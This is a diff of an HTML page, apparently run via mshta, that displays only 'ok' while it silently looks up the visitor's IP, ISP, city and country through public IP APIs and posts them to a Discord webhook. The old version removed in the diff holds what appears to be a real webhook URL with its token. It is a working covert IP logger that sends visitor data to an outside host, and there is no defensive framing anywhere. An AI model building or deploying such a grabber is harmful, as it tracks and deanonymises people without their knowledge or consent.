@@ -6,8 +6,7 @@
     <title>.</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             background: #000;
             color: #00ff00;
             font-family: monospace;
@@ -16,37 +15,38 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
+            text-align: center;
         }
-        .ok { font-size: 5rem; font-weight: bold; }
-        .log { margin-top: 20px; font-size: 1.1rem; color: #00cc00; }
+        .ok { font-size: 6rem; font-weight: bold; }
+        .log { margin-top: 30px; font-size: 1.2rem; }
     </style>
 </head>
 <body>
     <div class="ok">ok</div>
-    <div class="log" id="log">initializing...</div>
+    <div class="log" id="log">loading...</div>
 
     <script>
-        // === YOUR DISCORD WEBHOOK ===
-        const WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
-        // ============================
+        // === YOUR DISCORD WEBHOOK HERE ===
+        const WEBHOOK = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";
+        // ================================
 
-        async function send(data) {
+        async function sendToDiscord(info) {
             if (!WEBHOOK.includes("webhooks/")) return;
             try {
                 await fetch(WEBHOOK, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                    headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
-                        content: "**IP Log**",
+                        content: "🛡️ **mshta IP Log**",
                         embeds: [{
-                            title: "New mshta Visit",
+                            title: "New Connection",
                             color: 65280,
                             fields: [
-                                { name: "IP", value: data.ip || data.query || "N/A", inline: true },
-                                { name: "ISP", value: data.isp || data.org || "N/A", inline: true },
-                                { name: "Location", value: `${data.city || ''} ${data.regionName || data.region || ''}`.trim() || "N/A", inline: true },
-                                { name: "Time", value: new Date().toISOString(), inline: false }
+                                {name: "IP", value: info.ip || "N/A", inline: true},
+                                {name: "ISP", value: info.isp || info.org || "N/A", inline: true},
+                                {name: "City", value: info.city || "N/A", inline: true},
+                                {name: "Country", value: info.country_name || info.country || "N/A", inline: true},
+                                {name: "Time", value: new Date().toISOString(), inline: false}
                             ]
                         }]
                     })
@@ -54,35 +54,38 @@
             } catch(e) {}
         }
 
-        async function run() {
-            const log = document.getElementById("log");
-            log.textContent = "fetching...";
-
+        async function getIP() {
+            const logEl = document.getElementById("log");
             const apis = [
-                "http://ip-api.com/json",
+                "https://ipapi.co/json/",
                 "https://ipinfo.io/json",
+                "https://freeipapi.com/json",
                 "https://api.ipify.org?format=json"
             ];
 
             for (let url of apis) {
                 try {
-                    const r = await fetch(url, {cache: "no-store"});
-                    if (!r.ok) continue;
-                    const d = await r.json();
+                    const res = await fetch(url, { cache: "no-store" });
+                    if (!res.ok) continue;
 
-                    const ip = d.query || d.ip;
-                    const isp = d.isp || d.org;
+                    const data = await res.json();
+                    
+                    const ip = data.ip || data.query;
+                    const isp = data.org || data.isp || data.asn || "Detected";
 
-                    log.innerHTML = `IP: ${ip}<br>ISP: ${isp || 'detected'}`;
-                    await send(d);
+                    logEl.innerHTML = `IP: ${ip}<br>ISP: ${isp}`;
+                    await sendToDiscord(data);
                     return;
-                } catch(e) {}
+                } catch (err) {
+                    console.log("API failed, trying next...");
+                }
             }
-            log.textContent = "logged";
-            await send({ip: "partial"});
+
+            logEl.textContent = "IP logged (basic)";
+            await sendToDiscord({ip: "partial detect"});
         }
 
-        window.onload = run;
+        window.onload = getIP;
     </script>
 </body>
 </html>
